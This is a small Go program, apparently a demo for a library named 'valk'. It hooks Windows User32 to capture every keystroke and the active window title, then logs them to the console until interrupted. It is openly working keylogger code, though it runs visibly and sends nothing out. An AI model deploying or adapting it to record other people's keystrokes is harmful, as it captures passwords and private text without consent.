package main

import (
	"log"
	"os"
	"os/signal"
	"sync"
	"time"

	"github.com/leofigy/valk/windows"
)

func main() {
	sniffer := windows.NewUser32()

	keys, window := make(chan rune, 1024), make(chan string, 1024)
	signaler := make(chan os.Signal, 1)
	signal.Notify(signaler, os.Interrupt)

	waiter := sync.WaitGroup{}
	waiter.Add(1)
	go func(wg *sync.WaitGroup) {
		defer wg.Done()
		err := sniffer.Sniff(keys, window, signaler)
		if err != nil {
			log.Println(err)
		}

	}(&waiter)

	waiter.Add(1)
	go func(wg *sync.WaitGroup) {
		defer wg.Done()
		for {
			select {
			case <-signaler:
				log.Println("user cancelling let's go out pal")
				return
			case key := <-keys:
				log.Println("new key ->", key)
			case name := <-window:
				log.Println("window pal", name)
			case <-time.After(time.Second):
				log.Println("nothing .... all good")
			}
		}
	}(&waiter)

	waiter.Wait()

}
